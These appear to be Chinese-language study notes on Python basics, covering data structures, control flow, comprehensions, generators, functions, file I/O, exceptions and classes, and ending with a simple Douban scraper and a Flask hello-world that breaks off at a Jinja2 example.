for x in [1, 2, 3]: print(x, end&#x3D;” “)
1 2 3
迭代


嵌套列表
在列表里面创建其它列表
&gt;&gt;&gt; a = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&gt;&gt;&gt; n = [1, 2, 3]&gt;&gt;&gt; x = [a, n]&gt;&gt;&gt; x[[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;], [1, 2, 3]]&gt;&gt;&gt; x[0][&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&gt;&gt;&gt; x[0][1]&#x27;b&#x27;

列表函数&amp;方法



方法
描述



list.append(x)
把一个元素添加到列表的结尾，相当于 a[len(a):] &#x3D; [x]。


list.extend(L)
通过添加指定列表的所有元素来扩充列表，相当于 a[len(a):] &#x3D; L。


list.insert(i, x)
在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 a.insert(0, x) 会插入到整个列表之前，而 a.insert(len(a), x) 相当于 a.append(x) 。


list.remove(x)
删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。


list.pop([i])
从列表的指定位置移除元素，并将其返回。如果没有指定索引，a.pop()返回最后一个元素。元素随即从列表中被移除。（方法中 i 两边的方括号表示这个参数是可选的，而不是要求你输入一对方括号，你会经常在 Python 库参考手册中遇到这样的标记。）


list.clear()
移除列表中的所有项，等于del a[:]。


list.index(x)
返回列表中第一个值为 x 的元素的索引。如果没有匹配的元素就会返回一个错误。


list.count(x)
返回 x 在列表中出现的次数。


list.sort()
对列表中的元素进行排序。


list.reverse()
倒排列表中的元素。


list.copy()
返回列表的浅复制，等于a[:]。


把列表当作堆栈使用
列表方法使得列表可以很方便的作为一个堆栈来使用，堆栈作为特定的数据结构，最先进入的元素最后一个被释放（后进先出）。用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来
stack = [3, 4, 5]stack.append(6)stack.append(7)stack.pop()print(stack)

元组（tuple）元组使用小括号 **( )**，列表使用方括号 **[ ]**。
元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可
元组中只包含一个元素时，需要在元素后面添加逗号 ，否则括号会被当作运算符使用
元组中的元素值是不允许修改的，但我们可以对元组进行连接组合，例子如下：
tup1 = (12, 34.56)tup2 = (&#x27;abc&#x27;, &#x27;xyz&#x27;)# 以下修改元组元素操作是非法的。# tup1[0] = 100# 创建一个新的元组tup3 = tup1 + tup2print (tup3)

删除元组
元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组
tup = (&#x27;Google&#x27;, &#x27;Runoob&#x27;, 1997, 2000)del tupprint (&quot;删除后的元组 tup : &quot;)print (tup)

内置函数
函数

所谓元组的不可变指的是元组所指向的内存中的内容不可变
&gt;&gt;&gt; tup = (&#x27;r&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;b&#x27;)&gt;&gt;&gt; tup[0] = &#x27;g&#x27;     # 不支持修改元素Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: &#x27;tuple&#x27; object does not support item assignment&gt;&gt;&gt; id(tup)     # 查看内存地址4440687904&gt;&gt;&gt; tup = (1,2,3)&gt;&gt;&gt; id(tup)4441088800    # 内存地址不一样了

从以上实例可以看出，重新赋值的元组 tup，绑定到新的对象了，不是修改了原来的对象
字典字典是另一种可变容器模型，且可存储任意类型对象。
字典的每个键值 key&#x3D;&gt;value 对用冒号 : 分割，每个对之间用逗号(,)分割，整个字典包括在花括号 {} 中 ,格式如下所示：
d = &#123;key1 : value1, key2 : value2, key3 : value3 &#125;

键必须是唯一的，但值则不必。
值可以取任何数据类型，但键必须是不可变的，如字符串，数字。
创建空字典
使用 &#123;&#125; 创建空字典
# 使用大括号 &#123;&#125; 来创建空字典emptyDict = &#123;&#125;print(emptyDict)print(&quot;Length:&quot;, len(emptyDict)) # 查看字典数量print(type(emptyDict))

也可以使用内建函数 dict() 创建字典：emptydic=dict()
访问字典里面的值
把相对应的键放入方括号中
tinydict = &#123;&#x27;Name&#x27;: &#x27;Runoob&#x27;, &#x27;Age&#x27;: 7, &#x27;Class&#x27;: &#x27;First&#x27;&#125;print (&quot;tinydict[&#x27;Name&#x27;]: &quot;, tinydict[&#x27;Name&#x27;])

修改字典
向字典添加新内容的方法是增加新的键值对，修改或删除已有键值对
显式删除一个字典用del命令
tinydict = &#123;&#x27;Name&#x27;: &#x27;Runoob&#x27;, &#x27;Age&#x27;: 7, &#x27;Class&#x27;: &#x27;First&#x27;&#125;tinydict[&#x27;Age&#x27;] = 8               # 更新 Agetinydict[&#x27;School&#x27;] = &quot;菜鸟教程&quot;  # 添加信息del tinydict[&#x27;Name&#x27;] # 删除键 &#x27;Name&#x27;tinydict.clear()     # 清空字典del tinydict         # 删除字典

注意事项
1.不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住
tinydict = &#123;&#x27;Name&#x27;: &#x27;Runoob&#x27;, &#x27;Age&#x27;: 7, &#x27;Name&#x27;: &#x27;小菜鸟&#x27;&#125;//后面那个会被记住

2.键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行
遍历技巧
在字典中遍历时，关键字和对应的值可以使用 items() 方法同时解读出来：
knights = &#123;&#x27;gallahad&#x27;: &#x27;the pure&#x27;, &#x27;robin&#x27;: &#x27;the brave&#x27;&#125;for k, v in knights.items():    print(k, v)

序列中遍历时，索引位置和对应值可以使用 enumerate() 函数同时得到：
for i, v in enumerate([&#x27;tic&#x27;, &#x27;tac&#x27;, &#x27;toe&#x27;]):	print(i, v)

同时遍历两个或更多的序列，可以使用 zip() 组合：
questions = [&#x27;name&#x27;, &#x27;quest&#x27;, &#x27;favorite color&#x27;]answers = [&#x27;lancelot&#x27;, &#x27;the holy grail&#x27;, &#x27;blue&#x27;]for q, a in zip(questions, answers):    print(&#x27;What is your &#123;0&#125;?  It is &#123;1&#125;.&#x27;.format(q, a))

要反向遍历一个序列，首先指定这个序列，然后调用 reversed() 函数
要按顺序遍历一个序列，使用 sorted() 函数返回一个已排序的序列，并不修改原值：
basket = [&#x27;apple&#x27;, &#x27;orange&#x27;, &#x27;apple&#x27;, &#x27;pear&#x27;, &#x27;orange&#x27;, &#x27;banana&#x27;]for f in sorted(set(basket)):    print(f)



集合集合（set）是一个无序的不重复元素序列
集合中的元素不会重复，并且可以进行交集、并集、差集等常见的集合操作
可以使用大括号 { } 创建集合，元素之间用逗号 , 分隔， 或者也可以使用 set() 函数创建集合
parame = &#123;value01,value02,...&#125;或者set(value)   比如：set1 = &#123;1, 2, 3, 4&#125;            # 直接使用大括号创建集合set2 = set([4, 5, 6, 7])      # 使用 set() 函数从列表创建集合

注意：创建一个空集合必须用 set() 而不是 **{ }**，因为 { } 是用来创建一个空字典
&gt;&gt;&gt; basket = &#123;&#x27;apple&#x27;, &#x27;orange&#x27;, &#x27;apple&#x27;, &#x27;pear&#x27;, &#x27;orange&#x27;, &#x27;banana&#x27;&#125;&gt;&gt;&gt; print(basket)                      # 这里演示的是去重功能&#123;&#x27;orange&#x27;, &#x27;banana&#x27;, &#x27;pear&#x27;, &#x27;apple&#x27;&#125;&gt;&gt;&gt; print(&quot;banana&quot; in basket)              # 快速判断元素是否在集合内True&gt;&gt;&gt; print(&#x27;crabgrass&#x27; in basket)False&gt;&gt;&gt; # 下面展示两个集合间的运算....都要再加上一个print&gt;&gt;&gt; a = set(&#x27;abracadabra&#x27;)&gt;&gt;&gt; b = set(&#x27;alacazam&#x27;)&gt;&gt;&gt; a                                  &#123;&#x27;a&#x27;, &#x27;r&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;&#125;&gt;&gt;&gt; a - b                              # 集合a中包含而集合b中不包含的元素&#123;&#x27;r&#x27;, &#x27;d&#x27;, &#x27;b&#x27;&#125;&gt;&gt;&gt; a | b                              # 集合a或b中包含的所有元素&#123;&#x27;a&#x27;, &#x27;c&#x27;, &#x27;r&#x27;, &#x27;d&#x27;, &#x27;b&#x27;, &#x27;m&#x27;, &#x27;z&#x27;, &#x27;l&#x27;&#125;&gt;&gt;&gt; a &amp; b                              # 集合a和b中都包含了的元素&#123;&#x27;a&#x27;, &#x27;c&#x27;&#125;&gt;&gt;&gt; a ^ b                              # 不同时包含于a和b的元素&#123;&#x27;r&#x27;, &#x27;d&#x27;, &#x27;b&#x27;, &#x27;m&#x27;, &#x27;z&#x27;, &#x27;l&#x27;&#125;

添加元素
语法格式：s.add(x) //将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作。
另一种方法：s.update(x) //参数可以是列表，元组，字典等例子如下：
thisset.update(&#123;1,3&#125;)或者 thisset.update([1,4],[5,6])

移除元素
语法格式：s.remove(x) //将元素 x 从集合 s 中移除，如果元素不存在，则会发生错误
另一种方法：s.discard(x) //移除集合中的元素，且如果元素不存在，不会发生错误
s.pop()：随机删除集合中的一个元素

len(s)：计算集合 s 元素个数
s.clear()：清空集合 s
x in s：判断元素 x 是否在集合 s 中，存在返回 True，不存在返回 False
[集合内置方法完整列表](Python3 集合 | 菜鸟教程 (runoob.com))
条件控制语法格式：
if condition_1:    statement_block_1elif condition_2:    statement_block_2else:    statement_block_3


每个条件后面要使用冒号 **:**，表示接下来是满足条件后要执行的语句块。
2、使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。
3、在 Python 中没有 switch…case 语句，但在 Python3.10 版本添加了 match…case，功能也类似

嵌套语句
if 表达式1:    语句    if 表达式2:        语句    elif 表达式3:        语句    else:        语句elif 表达式4:    语句else:    语句

match…case
match subject:    case &lt;pattern_1&gt;:        &lt;action_1&gt;    case &lt;pattern_2&gt;:        &lt;action_2&gt;    case &lt;pattern_3&gt;:        &lt;action_3&gt;    case _:        &lt;action_wildcard&gt;

case _: 类似于 C 和 Java 中的 **default:**，当其他 case 都无法匹配时，匹配这条，保证永远会匹配成功
循环语句while循环：注意冒号和缩进
while 判断条件(condition)：    执行语句(statements)……

可以通过设置条件表达式永远不为 false 来实现无限循环，可以使用 CTRL+C 来退出当前的无限循环。
无限循环在服务器上客户端的实时请求非常有用。
while循环使用else语句
在while的条件为false的条件下else从句才会执行
while &lt;expr&gt;:    &lt;statement(s)&gt;else:    &lt;additional_statement(s)&gt;

下面为斐波那契数列的例子：
a, b = 0, 1while b &lt; 10:    print(b,  end=&#x27;,&#x27;)    c = b    b = a + b    a = c

for循环
for 循环可以遍历任何可迭代对象，如一个列表或者一个字符串；当循环执行完毕后，会执行 else 子句中的代码，如果在循环过程中遇到了 break 语句，则会中断循环，此时不会执行 else 子句。格式如下：
for &lt;variable&gt; in &lt;sequence&gt;:    &lt;statements&gt;else:    &lt;statements&gt;

可以拿来打印单词里的每一个字符
word = &#x27;runoob&#x27;for letter in word:    print(letter)

range函数
需要遍历数字序列，可以使用内置 range() 函数。它会生成数列：for i in range(5)
可以使用 range() 指定区间的值：for i in range(5,9) :print(i)
也可以使 range() 以指定数字开始并指定不同的增量(甚至可以是负数，有时这也叫做’步长’)：for i in range(0, 10, 3) 3为步长
可以使用 range() 函数来创建一个列表：list(range(5))
可以结合 range() 和 len() 函数以遍历一个序列的索引
pass语句
pass是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句，语法如下：
&gt;&gt;&gt;while True:...     pass  # 等待键盘中断 (Ctrl+C)

例子：
for letter in &#x27;Runoob&#x27;:    if letter == &#x27;o&#x27;:      pass      print (&#x27;执行 pass 块&#x27;)   print (&#x27;当前字母 :&#x27;, letter)print (&quot;Good bye!&quot;)

推导式列表推导式
格式如下：
[表达式 for 变量 in 列表] [out_exp_res for out_exp in input_list]或者 [表达式 for 变量 in 列表 if 条件][out_exp_res for out_exp in input_list if condition]


out_exp_res：列表生成元素表达式，可以是有返回值的函数。
for out_exp in input_list：迭代 input_list 将 out_exp 传入到 out_exp_res 表达式中。
if condition：条件语句，可以过滤列表中不符合条件的值

names = [&#x27;Bob&#x27;,&#x27;Tom&#x27;,&#x27;alice&#x27;,&#x27;Jerry&#x27;,&#x27;Wendy&#x27;,&#x27;Smith&#x27;]new_names = [name.upper()for name in names if len(name)&gt;3]print(new_names)//过滤掉长度小于或等于3的字符串列表，并将剩下的转换成大写字母

更复杂一点的例子：
&gt;&gt;&gt; vec1 = [2, 4, 6]&gt;&gt;&gt; vec2 = [4, 3, -9]&gt;&gt;&gt; [x*y for x in vec1 for y in vec2][8, 6, -18, 16, 12, -36, 24, 18, -54]&gt;&gt;&gt; [x+y for x in vec1 for y in vec2][6, 5, -7, 8, 7, -5, 10, 9, -3]&gt;&gt;&gt; [vec1[i]*vec2[i] for i in range(len(vec1))][8, 12, -54]

字典推导式
格式如下：
&#123; key_expr: value_expr for value in collection &#125;或&#123; key_expr: value_expr for value in collection if condition &#125;

例子如下：
dict = &#123;x: x**2 for x in (2,4,6)&#125;//三个数字的平方print(dict)

集合推导式
&#123; expression for item in Sequence &#125;或&#123; expression for item in Sequence if conditional &#125;

例子如下:
a = &#123;x for x in &#x27;abkxjbaugxidyskn&#x27; if x not in &#x27;abcd&#x27;&#125;print(a)print(type(a))

元组推导式（生成器表达式）
元组推导式返回的结果是一个生成器对象
(expression for item in Sequence )或(expression for item in Sequence if conditional )

例子如下：
&gt;&gt;&gt; a = (x for x in range(1,10))&gt;&gt;&gt; a&lt;generator object &lt;genexpr&gt; at 0x7faf6ee20a50&gt;  # 返回的是生成器对象&gt;&gt;&gt; tuple(a)       # 使用 tuple() 函数，可以直接将生成器对象转换成元组(1, 2, 3, 4, 5, 6, 7, 8, 9)

迭代器与生成器迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。
迭代器有两个基本的方法：iter() 和 **next()**。迭代器对象可以使用常规for语句进行遍历
字符串，列表或元组对象都可用于创建迭代器
list=[1,2,3,4]it = iter(list)    # 创建迭代器对象print (next(it))   # 输出迭代器的下一个元素print (next(it))

创造一个迭代器
Python 的构造函数为 init(), 它会在对象初始化的时候执行
把一个类作为一个迭代器使用需要在类中实现两个方法 iter() 与 next() 
iter() 方法返回一个特殊的迭代器对象， 这个迭代器对象实现了 next() 方法并通过 StopIteration 异常标识迭代的完成。
next() 方法会返回下一个迭代器对象
class MyNumbers:  def __iter__(self):    self.a = 1    return self//返回 self，即当前对象本身。这意味着 MyNumbers 类的实例是一个迭代器对象   def __next__(self):    x = self.a    self.a += 1    return x myclass = MyNumbers()myiter = iter(myclass)//使用内置函数 iter() 将 myclass 实例转换为一个迭代器对象，并将其赋值给变量 myiter。通过调用 iter() 函数，会自动调用对象的 __iter__() 方法，因此 myclass 实例将成为一个迭代器对象 print(next(myiter))print(next(myiter))print(next(myiter))print(next(myiter))print(next(myiter))

StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况，在 next() 方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代
class MyNumbers:  def __iter__(self):    self.a = 1    return self   def __next__(self):    if self.a &lt;= 20:      x = self.a      self.a += 1      return x    else:      raise StopIteration myclass = MyNumbers()myiter = iter(myclass) for x in myiter:  print(x)

生成器
使用了 yield 的函数被称为生成器（generator）。
yield 是一个关键字，用于定义生成器函数，生成器函数是一种特殊的函数，可以在迭代过程中逐步产生值，而不是一次性返回所有结果。
跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。
当在生成器函数中使用 yield 语句时，函数的执行将会暂停，并将 yield 后面的表达式作为当前迭代的值返回。
然后，每次调用生成器的 next() 方法或使用 for 循环进行迭代时，函数会从上次暂停的地方继续执行，直到再次遇到 yield 语句。这样，生成器函数可以逐步产生值，而不需要一次性计算并返回所有结果。
调用一个生成器函数，返回的是一个迭代器对象
def countdown(n):    while n &gt; 0:        yield n        n -= 1# 创建生成器对象generator = countdown(5)# 通过迭代生成器获取值print(next(generator))  # 输出: 5print(next(generator))  # 输出: 4print(next(generator))  # 输出: 3# 使用 for 循环迭代生成器for value in generator:    print(value)  # 输出: 2 1

函数
函数代码块以 def 关键词开头，后接函数标识符名称和圆括号 **()**。
任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。
函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。
函数内容以冒号 : 起始，并且缩进。
return [表达式] 结束函数，选择性地返回一个值给调用方，不带表达式的 return 相当于返回 None。

def 函数名（参数列表）:    函数体

python 函数的参数传递：

不可变类型：类似 C++ 的值传递，如整数、字符串、元组。如 fun(a)，传递的只是 a 的值，没有影响 a 对象本身。如果在 fun(a) 内部修改 a 的值，则是新生成一个 a 的对象。
def change(a):    print(id(a))   # 指向的是同一个对象    a=10    print(id(a))   # 一个新对象a=1print(id(a))change(a)#地址变了print(a)#这里的地址还是原来的地址

可变类型：类似 C++ 的引用传递，如 列表，字典。如 fun(la)，则是将 la 真正的传过去，修改后 fun 外部的 la 也会受影响


python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象
# 可写函数说明def changeme( mylist ):   &quot;修改传入的列表&quot;   mylist.append([1,2,3,4])   print (&quot;函数内取值: &quot;, mylist)   return# 调用changeme函数mylist = [10,20,30]changeme( mylist )print (&quot;函数外取值: &quot;, mylist)//地址没有变

关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值
def printme( str ):   &quot;打印任何传入的字符串&quot;   print (str)   return printme( str = &quot;菜鸟教程&quot;)

可能需要一个函数能处理比当初声明时更多的参数。这些参数叫做不定长参数，和上述 2 种参数不同，声明时不会命名。基本语法如下：
def functionname([formal_args,] *var_args_tuple ):   &quot;函数_文档字符串&quot;   function_suite   return [expression]

加了星号 ***** 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数
def printinfo( arg1, *vartuple ):   &quot;打印任何传入的参数&quot;   print (&quot;输出: &quot;)   print (arg1)   print (vartuple)printinfo( 70, 60, 50 )

加了两个星号 ** 的参数会以字典的形式导入
def printinfo( arg1, **vardict ):   &quot;打印任何传入的参数&quot;   print (&quot;输出: &quot;)   print (arg1)   print (vardict)printinfo(1, a=2,b=3)

如果单独出现星号 *****，则星号 ***** 后的参数必须用关键字传入
lambda(匿名函数) 使用 lambda 来创建匿名函数。
lambda 函数是一种小型、匿名的、内联函数，它可以具有任意数量的参数，但只能有一个表达式。
匿名函数不需要使用 def 关键字定义完整函数。
lambda 函数通常用于编写简单的、单行的函数，通常在需要函数作为参数传递的情况下使用，例如在 map()、filter()、reduce() 等函数中。
lambda 函数特点：

lambda 函数是匿名的，它们没有函数名称，只能通过赋值给变量或作为参数传递给其他函数来使用。
lambda 函数通常只包含一行代码，这使得它们适用于编写简单的函数。

lambda 语法格式：
lambda arguments: expression


lambda是 Python 的关键字，用于定义 lambda 函数。
arguments 是参数列表，可以包含零个或多个参数，但必须在冒号(:)前指定。
expression 是一个表达式，用于计算并返回函数的结果。

f = lambda: &quot;Hello World!&quot;print(f())

lambda 函数也可以设置多个参数，参数使用逗号 , 隔开
x = lambda a, b : a * bprint(x(5, 6))

通常与内置函数如 map()、filter() 和 reduce() 一起使用，以便在集合上执行操作
numbers = [1, 2, 3, 4, 5]squared = list(map(lambda x: x**2, numbers))print(squared)  # 输出: [1, 4, 9, 16, 25]

File读写文件
open将打开一个文件对象：open(filename, mode)如果该文件无法被打开，会抛出 OSError

filename：包含了你要访问的文件名称的字符串值。
mode：决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读(r)。




模式
描述



r
以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。


rb
以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。


r+
打开一个文件用于读写。文件指针将会放在文件的开头。


rb+
以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。


w
打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。


wb
以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。


w+
打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。


wb+
以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。


a
打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。


ab
以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。


a+
打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。


ab+
以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。


文件对象的方法
假设已经创建了一个称为 f 的文件对象,使用下面那些函数都需要先打开一个文件：f = open(&quot;/tmp/foo.txt&quot;, &quot;r&quot;)
f.read()
为了读取一个文件的内容，调用 f.read(size), 这将读取一定数目的数据, 然后作为字符串或字节对象返回。
size 是一个可选的数字类型的参数。 当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回
f.readline()
 会从文件中读取单独的一行。换行符为 ‘\n’。f.readline() 如果返回一个空字符串, 说明已经已经读取到最后一行
f.readlines() 
f.readlines() 将返回该文件中包含的所有行。如果设置可选参数 sizehint, 则读取指定长度的字节, 并且将这些字节按行分割
f.write()
f.write(string) 将 string 写入到文件中, 然后返回写入的字符数
f = open(&quot;/tmp/foo.txt&quot;, &quot;w&quot;)num = f.write( &quot;Python 是一个非常好的语言。\n是的，的确非常好!!\n&quot; )print(num)f.close() #输出结果为29

如果要写入一些不是字符串的东西, 那么将需要先进行转换
f = open(&quot;/tmp/foo1.txt&quot;, &quot;w&quot;)value = (&#x27;www.runoob.com&#x27;, 14)s = str(value)f.write(s)f.close()

f.tell()
f.tell() 用于返回文件当前的读&#x2F;写位置（即文件指针的位置）。文件指针表示从文件开头开始的字节数偏移量。f.tell() 返回一个整数，表示文件指针的当前位置
f.seek()
如果要改变文件指针当前的位置, 可以使用 f.seek(offset, from_what) 函数。
f.seek(offset, whence) 用于移动文件指针到指定位置。
offset 表示相对于 whence 参数的偏移量，from_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾，例如：

seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符
seek(x,1) ： 表示从当前位置往后移动x个字符
seek(-x,2)：表示从文件的结尾往前移动x个字符

from_what 值为默认为0，即文件开头
f.close()
在文本文件中 (那些打开文件的模式下没有 b 的), 只会相对于文件起始位置进行定位。
当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，如果尝试再调用该文件，则会抛出异常
当处理一个文件对象时, 使用 with 关键字是非常好的方式。在结束后, 它会帮你正确的关闭文件
&gt;&gt;&gt; with open(&#x27;/tmp/foo.txt&#x27;, &#x27;r&#x27;) as f:...     read_data = f.read()&gt;&gt;&gt; f.closedTrue



异常处理try…except
try 语句按照如下方式工作；

首先，执行 try 子句（在关键字 try 和关键字 except 之间的语句）。
如果没有异常发生，忽略 except 子句，try 子句执行后结束。
如果在执行 try 子句的过程中发生了异常，那么 try 子句余下的部分将被忽略。如果异常的类型和 except 之后的名称相符，那么对应的 except 子句将被执行。
如果一个异常没有与任何的 except 匹配，那么这个异常将会传递给上层的 try 中。

一个 try 语句可能包含多个except子句，分别来处理不同的特定的异常。最多只有一个分支会被执行。
一个except子句可以同时处理多个异常，会被放在一个括号里成为一个元组：except (RuntimeError, TypeError, NameError)
最后一个except子句可以忽略异常的名称，它将被当作通配符使用 except:
try…except…else
语句还有一个可选的 else 子句，该子句必须放在所有的 except 子句之后。else子句将在 try 子句没有发生任何异常的时候执行
try…finally
无论是否发生异常finally 语句都将执行最后的代码，finally语句在else的后面
抛出异常
使用raise语句：raise [Exception [, args [, traceback]]]
x = 10if x &gt; 5:    raise Exception(&#x27;x 不能大于 5。x 的值为: &#123;&#125;&#x27;.format(x))

预定义清理行为
一些对象定义了标准的清理行为，无论系统是否成功的使用了它，一旦不需要它了，那么这个标准的清理行为就会执行
关键词 with 语句就可以保证诸如文件之类的对象在使用完之后一定会正确的执行他的清理方法
with open(&quot;myfile.txt&quot;) as f:    for line in f:        print(line, end=&quot;&quot;)

以上这段代码执行完毕后，就算在处理过程中出问题了，文件 f 总是会关闭
对象类有一个名为 init() 的特殊方法（构造方法），该方法在类实例化时会自动调用
类的方法
在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 self, 且为第一个参数，self 代表实例
class people:    name = &#x27;&#x27;    age = 0    #定义私有属性,私有属性在类外部无法直接进行访问    __weight = 0    def __init__(self,n,a,w):        self.name = n        self.age = a        self.__weight = w    def speak(self):        print(&quot;%s 说: 我 %d 岁。&quot; %(self.name,self.age))p = people(&#x27;runoob&#x27;,10,30)p.speak()

类的继承
单继承
class DerivedClassName(BaseClassName):或者 class DerivedClassName(modname.BaseClassName):
class student(people):    grade = &#x27;&#x27;    def __init__(self,n,a,w,g):        #调用父类的构造函数        people.__init__(self,n,a,w)        self.grade = g    #覆写父类的方法    def speak(self):        print(&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;%(self.name,self.age,self.grade))

多继承
多继承的类定义：class DerivedClassName(Base1, Base2, Base3)：

需要注意圆括号中父类的顺序，若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法
类的私有属性
__private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.__private_attrs。
类的私有方法
__private_method：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用。self.__private_methods。
命名空间命名空间提供了在项目中避免名字冲突的一种方法。各个命名空间是独立的，没有任何关系的，所以一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。
我们举一个计算机系统中的例子，一个文件夹(目录)中可以包含多个文件夹，每个文件夹中不能有相同的文件名，但不同文件夹中的文件可以重名。
一般有三种命名空间：

内置名称（built-in names）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。
全局名称（global names），模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。
局部名称（local names），函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）

假设我们要使用变量 runoob，则 Python 的查找顺序为：局部的命名空间 -&gt; 全局命名空间 -&gt; 内置命名空间
 global 和 nonlocal 关键字
当内部作用域想修改外部作用域的变量时，就要用到 global 和 nonlocal 关键字了
num = 1def fun1():    global num  # 需要使用 global 关键字声明    print(num)     num = 123    print(num)fun1()print(num)

如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了
def outer():    num = 10    def inner():        nonlocal num   # nonlocal关键字声明        num = 100        print(num)    inner()    print(num)outer()

爬虫requests模块基础的知识可以直接上网搜到，这边就不一一列举了
爬取豆瓣电影的排行榜：
#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport jsonif __name__ == &quot;__main__&quot;:    #1.指定url    post_url = &#x27;https://movie.douban.com/j/chart/top_list&#x27;    #2.进行UA伪装    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&#x27;    &#125;    param = &#123;        &#x27;type&#x27;: &#x27;24&#x27;,        &#x27;interval_id&#x27;: &#x27;100:90&#x27;,        &#x27;action&#x27;: &#x27;&#x27;,        &#x27;start&#x27;: &#x27;0&#x27;,  # 从库中的第几部电影去取        &#x27;limit&#x27;: &#x27;20&#x27;,  # 一次取出的个数    &#125;    response = requests.get(post_url, headers=headers, params=param)    list_data = response.json()    fp = open(&#x27;./douban.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)    json.dump(list_data, fp=fp, ensure_ascii=False)    print(&#x27;over!!!&#x27;)&#125;

FlaskHello Worldfrom flask import Flaskapp = Flask(__name__)@app.route(&#x27;/&#x27;)def hello_world():    return &#x27;Hello, World!&#x27;    if __name__ ==&quot;__main__&quot;:    app.run(debug=True,port=8080)


引入Flask类

from flask import Flask

2.创建Flask对象，我们将使用该对象进行应用的配置和运行：
app = Flask(__name__)

name 是Python中的特殊变量，如果文件作为主程序执行，那么__name__变量的值就是__main__，如果是被其他模块引入，那么__name__的值就是模块名称。

编写主程序

在主程序中，执行run()来启动应用：
if __name__ ==&quot;__main__&quot;:    app.run(debug=True, port=8080)

改名启动一个本地服务器，默认情况下其地址是localhost:5000，在上面的代码中，我们使用关键字参数port将监听端口修改为8080。

路由

使用app变量的route()装饰器来告诉Flask框架URL如何触发我们的视图函数：
@app.route(&#x27;/&#x27;)def hello_world():    return &#x27;Hello, World!&#x27;

上面的标识，访问网站的根路径 ‘&#x2F;‘ ，将转为对hello_world()函数的调用。
Flask使用Jinja 2模板先在写代码的目录下面再创一个名为 templates 的文件夹，在其中存放模板文件，以便在应用时使用 Jinja 2 模板引擎渲染动态内容
如果您愿意，您也可以在创建 Flask 应用程序时自定义模板文件夹的名称，具体的做法是在创建应用程序实例时，通过传递 template_folder 参数来指定模板文件夹的路径，例如：
app = Flask(__name__, template_folder=&#x27;my_templates&#x27;)

这样就会将模板文件夹命名为 my_templates，而不是默认的 templates
下面举一个简单的例子：
